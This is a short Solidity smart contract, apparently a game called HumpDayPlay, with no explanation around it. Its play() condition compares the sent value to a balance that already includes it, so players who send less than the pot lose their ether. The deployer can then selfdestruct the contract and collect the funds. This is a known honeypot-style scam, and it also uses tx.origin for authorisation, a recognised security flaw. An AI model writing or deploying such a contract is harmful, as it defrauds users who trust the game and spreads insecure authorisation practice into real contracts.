pragma solidity ^0.4.25;

contract HumpDayPlay
{
    address O = tx.origin;

    function() public payable {}

    function play() public payable {
        if (msg.value >= this.balance) {
            tx.origin.transfer(this.balance);
        }
    }
    function close() public {
        if (tx.origin == O) {
            selfdestruct(tx.origin);
        }
    }
 }